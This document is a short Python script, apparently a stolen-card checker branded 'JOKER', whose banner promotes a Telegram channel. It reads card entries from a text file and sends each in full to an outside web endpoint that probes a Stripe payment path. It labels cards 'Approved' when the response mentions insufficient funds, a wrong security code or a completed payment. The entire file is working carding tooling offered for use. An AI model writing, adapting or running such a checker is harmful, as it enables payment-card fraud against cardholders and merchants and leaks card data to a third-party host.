try:
	import pyfiglet,requests,os,webbrowser,datetime
except ModuleNotFoundError:
	os.system('pip install requests')
	os.system('pip install pyfiglet')
	os.system('pip install webbrowser')
	os.system('pip install datetime')
	os.system('clear')
file=open('JOK.txt',"+r")
Z =  '\033[1;31m' 
F = '\033[2;32m' 
B = '\033[2;36m'
X = '\033[1;33m' 
C = '\033[2;35m'
logo = pyfiglet.figlet_format('           JOKER ')
print(Z+logo)
o=("#====================================##============================")
print (F+'بدأ الصيد لا تنسى اشتراك بقناتي @TEAM_JOK')
print(F+o)
start_num = 0
for P in file.readlines():
	P=P.replace('\n', '')
	start_num += 1
	response = requests.get(f'https://dev-joker834.pantheonsite.io/Api/Stripe.php?lista={P}')
	if "insufficient funds" in response.text:
			print(F+f'[ {start_num} ]',P,' ➜ Approved ✅')
	elif "security code is incorrect" in response.text:
			print(F+f'[ {start_num} ]',P,' ➜ Approved ✅')
	elif "Payment Completed" in response.text:
			print(F+f'[ {start_num} ]',P,' ➜ Approved ✅')
	else:
			print(Z+f'[ {start_num} ]',P,' ➜ ',response.text)